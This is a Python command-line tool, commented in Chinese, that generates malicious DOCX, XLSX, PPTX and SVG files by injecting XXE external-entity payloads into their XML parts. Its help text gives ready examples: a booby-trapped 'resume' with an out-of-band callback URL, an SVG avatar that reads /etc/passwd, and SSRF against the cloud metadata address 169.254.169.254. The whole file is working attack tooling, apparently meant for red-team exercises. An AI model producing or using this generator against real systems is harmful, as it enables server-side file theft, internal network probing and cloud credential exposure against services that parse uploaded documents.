#!/usr/bin/env python3
import argparse
import os
import re
import shutil
import zipfile
import xml.etree.ElementTree as ET
from typing import Tuple


# ===================== 格式配置中心 =====================
FORMAT_CONFIG = {
    'xlsx': {
        'type': 'zip',
        'inject_targets': [
            'xl/workbook.xml',       # 核心工作簿（最高优先级）
            'xl/sharedStrings.xml',  # 共享字符串表
            'xl/styles.xml'          # 样式表
        ],
        'description': 'Excel 2007+ 文档'
    },
    'docx': {
        'type': 'zip',
        'inject_targets': [
            'word/document.xml',     # 核心文档内容
            'word/header1.xml',      # 页眉（解析概率极高）
            'word/footer1.xml',      # 页脚
            'word/styles.xml'        # 样式表
        ],
        'description': 'Word 2007+ 文档'
    },
    'pptx': {
        'type': 'zip',
        'inject_targets': [
            'ppt/presentation.xml',  # 核心演示文稿
            'ppt/slides/slide1.xml', # 第一张幻灯片
            'ppt/slides/slide2.xml'  # 第二张幻灯片
        ],
        'description': 'PowerPoint 2007+ 文档'
    },
    'svg': {
        'type': 'xml',
        'inject_targets': ['self'],  # 自身就是XML文件
        'description': 'SVG 矢量图片'
    }
}


# ===================== 核心工具函数 =====================
def detect_file_type(file_path: str) -> Tuple[str, str]:
    """
    自动检测文件类型（一次IO读取，无逻辑冗余）
    返回：(格式类型, 错误信息)，错误信息为空则检测成功
    """
    if not os.path.exists(file_path):
        return '', '文件不存在'

    # 一次读取512字节，复用内容做所有检测，减少IO开销
    with open(file_path, 'rb') as f:
        content_sample = f.read(512)
    header = content_sample[:4]  # 前4字节用于ZIP判断

    # 1. ZIP格式检测（Office系列）
    if header.startswith(b'PK\x03\x04'):
        try:
            with zipfile.ZipFile(file_path, 'r') as zf:
                namelist = zf.namelist()
                if any(name.startswith('xl/') for name in namelist):
                    return 'xlsx', ''
                elif any(name.startswith('word/') for name in namelist):
                    return 'docx', ''
                elif any(name.startswith('ppt/') for name in namelist):
                    return 'pptx', ''
                else:
                    return '', 'ZIP文件不是有效的Office文档格式'
        except zipfile.BadZipFile:
            return '', '不是有效的ZIP/Office文件'

    # 2. SVG格式检测（严格特征匹配，无误判）
    if b'<svg' in content_sample:
        # 标准SVG必须包含xmlns命名空间，兼容无XML声明的极简SVG
        return 'svg', ''

    # 3. 普通XML但不是SVG的情况
    if content_sample.startswith(b'<?xml') and b'<svg' not in content_sample:
        return '', 'XML文件不是有效的SVG格式'

    # 4. 未知格式
    return '', '不支持的文件格式，仅支持 DOCX/XLSX/PPTX/SVG'


def safe_unzip(file_path: str, dir_path: str) -> None:
    """安全解压ZIP文件，修复Zip Slip路径遍历漏洞"""
    abs_dir_path = os.path.abspath(dir_path)
    os.makedirs(dir_path, exist_ok=True)

    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        # 先校验所有条目路径，再执行解压
        for member in zip_ref.namelist():
            member_full_path = os.path.join(dir_path, member)
            abs_member_path = os.path.abspath(member_full_path)
            if not abs_member_path.startswith(abs_dir_path + os.sep):
                shutil.rmtree(dir_path, ignore_errors=True)
                raise ValueError(f"检测到恶意路径遍历：文件 '{member}' 试图跳出临时目录")
        
        zip_ref.extractall(dir_path)


def safe_zip(dir_path: str, output_path: str) -> None:
    """安全打包ZIP文件，增加路径类型校验"""
    # 校验输出路径不能是目录
    if os.path.exists(output_path):
        if os.path.isdir(output_path):
            raise ValueError(f"输出路径不能是目录，请指定文件路径：{output_path}")
        os.remove(output_path)
    
    # 打包并重命名为目标格式
    temp_zip = shutil.make_archive(
        base_name=output_path,
        format='zip',
        root_dir=dir_path
    )
    os.rename(temp_zip, output_path)


def validate_doctype(doctype_str: str) -> bool:
    """
    利用标准库XML解析器做严格语法校验
    返回True表示语法正确，错误则抛出精准异常
    """
    # 构造最小测试XML文档，避免解析外部实体
    test_doc = f'<?xml version="1.0" encoding="UTF-8"?>\n{doctype_str}\n<root/>'
    try:
        parser = ET.XMLParser(resolve_entities=False)
        ET.fromstring(test_doc, parser=parser)
        return True
    except ET.ParseError as e:
        raise ValueError(
            f"Payload语法错误：{str(e)}\n"
            f"错误Payload内容：\n{doctype_str}"
        ) from e


def inject_xxe_to_xml_content(
    xml_content: str,
    custom_xxe: str = None,
    oob_url: str = None,
    verbose: bool = False
) -> str:
    """通用XML注入逻辑：智能定位+严格校验+无冗余异常"""
    # 1. 清理已有DOCTYPE（避免重复声明导致XML失效）
    if re.search(r'<!DOCTYPE[^>]+>', xml_content, re.IGNORECASE):
        if verbose:
            print("[D] 检测到已有DOCTYPE，已自动替换")
        xml_content = re.sub(r'<!DOCTYPE[^>]+>', '', xml_content, count=1, flags=re.IGNORECASE)

    # 2. 生成XXE Payload
    if custom_xxe:
        payload = custom_xxe.strip()
    else:
        payload = f'<!DOCTYPE ShiftSecurity [ <!ENTITY xxe SYSTEM "{oob_url}"> ]>'

    # 3. 严格语法校验（解析器级别的校验，比括号计数可靠100倍）
    validate_doctype(payload)

    if verbose:
        print(f"[D] 注入Payload：\n{payload}")

    # 4. 智能定位注入位置（XML声明后插入，无声明则插开头）
    xml_decl_match = re.search(r'<\?xml[^?]+\?>', xml_content, re.IGNORECASE)
    if xml_decl_match:
        insert_pos = xml_decl_match.end()
        modified_xml = xml_content[:insert_pos] + '\n' + payload + '\n' + xml_content[insert_pos:]
    else:
        modified_xml = payload + '\n' + xml_content

    # 5. 最终良构性校验（确保注入后不会破坏原XML结构）
    try:
        parser = ET.XMLParser(resolve_entities=False)
        ET.fromstring(modified_xml, parser=parser)
    except ET.ParseError as e:
        raise ValueError(f"注入后XML结构损坏：{str(e)}") from e

    return modified_xml


# ===================== 格式处理引擎 =====================
def process_zip_format(
    input_path: str,
    output_path: str,
    file_type: str,
    custom_xxe: str = None,
    oob_url: str = None,
    inject_all: bool = False,
    verbose: bool = False
) -> None:
    """处理ZIP类格式（DOCX/XLSX/PPTX）"""
    config = FORMAT_CONFIG[file_type]
    temp_dir = input_path + "_xxe_temp"

    try:
        print(f"[+] 正在解压{config['description']}：{input_path}")
        safe_unzip(input_path, temp_dir)

        # 选择注入点：全注入模式/单注入模式
        targets = config['inject_targets'] if inject_all else [config['inject_targets'][0]]
        for target_xml in targets:
            xml_path = os.path.join(temp_dir, target_xml)
            if not os.path.exists(xml_path):
                print(f"[-] 跳过不存在的文件：{target_xml}")
                continue

            print(f"[+] 正在注入：{target_xml}")
            with open(xml_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            modified_content = inject_xxe_to_xml_content(content, custom_xxe, oob_url, verbose)
            
            with open(xml_path, 'w', encoding='utf-8') as f:
                f.write(modified_content)

        print(f"[+] 正在重新打包文件")
        safe_zip(temp_dir, output_path)
        print(f"✅ 恶意{config['description']}已生成：{output_path}")

    finally:
        # 可靠清理临时目录，忽略清理错误
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            if verbose:
                print("[D] 临时目录已清理")


def process_svg_format(
    input_path: str,
    output_path: str,
    custom_xxe: str = None,
    oob_url: str = None,
    verbose: bool = False
) -> None:
    """处理SVG格式（纯XML）"""
    print(f"[+] 正在处理SVG图片：{input_path}")
    
    with open(input_path, 'r', encoding='utf-8') as f:
        svg_content = f.read()

    modified_svg = inject_xxe_to_xml_content(svg_content, custom_xxe, oob_url, verbose)

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(modified_svg)
    
    print(f"✅ 恶意SVG图片已生成：{output_path}")


# ===================== 主程序入口 =====================
def main():
    parser = argparse.ArgumentParser(
        description='🔧 多格式XXE Payload生成工具 - 支持 DOCX/XLSX/PPTX/SVG',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
==================== 实战使用示例 ====================
1. 生成Word OOB XXE（最常用）：
   python xxe_generator.py -f 正常简历.docx -o 恶意简历.docx -u http://你的BurpCollaborator地址

2. 生成SVG读取敏感文件：
   python xxe_generator.py -f 正常头像.svg -o 恶意头像.svg --xxe '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'

3. 全注入点模式（护网推荐，触发率最高）：
   python xxe_generator.py -f 正常数据.xlsx -o 恶意数据.xlsx -u http://dnslog.cn/xxe --inject-all -v

4. 云环境SSRF测试：
   python xxe_generator.py -f 正常课件.pptx -o 恶意课件.pptx --xxe '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>'
        '''
    )

    # 核心参数
    parser.add_argument('-f', '--file', required=True, help='输入的正常模板文件路径')
    parser.add_argument('-o', '--output', required=True, help='输出的恶意文件路径')
    
    # XXE配置参数
    parser.add_argument('--xxe', help='自定义完整XXE Payload（优先级高于URL）')
    parser.add_argument('-u', '--url', help='OOB外带回调URL（Burp Collaborator/DNSLog地址）')
    
    # 功能增强参数
    parser.add_argument('--inject-all', action='store_true', help='全注入点模式（注入所有目标XML，大幅提高触发率）')
    parser.add_argument('-v', '--verbose', action='store_true', help='开启调试模式，打印详细注入信息')

    args = parser.parse_args()

    try:
        # ========== 前置校验 ==========
        # 1. 自动检测文件格式
        file_type, err = detect_file_type(args.file)
        if err:
            raise ValueError(f"文件格式检测失败：{err}")
        print(f"[+] 检测到文件格式：{FORMAT_CONFIG[file_type]['description']}")

        # 2. 输出文件覆盖确认
        if os.path.exists(args.output):
            confirm = input(f"[!] 输出文件 {args.output} 已存在，是否覆盖？(y/N): ")
            if confirm.lower() != 'y':
                print("[-] 操作已取消")
                return

        # 3. Payload参数校验
        if not args.xxe and not args.url:
            raise ValueError("必须指定 --xxe 自定义Payload 或 -u OOB URL 其中之一")

        # ========== 格式分发处理 ==========
        config = FORMAT_CONFIG[file_type]
        if config['type'] == 'zip':
            process_zip_format(
                input_path=args.file,
                output_path=args.output,
                file_type=file_type,
                custom_xxe=args.xxe,
                oob_url=args.url,
                inject_all=args.inject_all,
                verbose=args.verbose
            )
        elif config['type'] == 'xml':
            process_svg_format(
                input_path=args.file,
                output_path=args.output,
                custom_xxe=args.xxe,
                oob_url=args.url,
                verbose=args.verbose
            )

        # 完成提示
        if not args.inject_all:
            print("💡 护网提示：添加 --inject-all 参数可大幅提高XXE触发成功率")

    except FileNotFoundError as e:
        print(f"\n❌ 文件错误：{e}")
    except zipfile.BadZipFile:
        print(f"\n❌ 格式错误：不是有效的ZIP/Office文件，请检查文件完整性")
    except PermissionError:
        print(f"\n❌ 权限错误：请检查文件读写权限，或更换输出路径")
    except ValueError as e:
        print(f"\n❌ 参数错误：{e}")
    except KeyboardInterrupt:
        print("\n[-] 用户中断操作")
    except Exception as e:
        print(f"\n❌ 未知错误：{str(e)}")


if __name__ == '__main__':
    main()
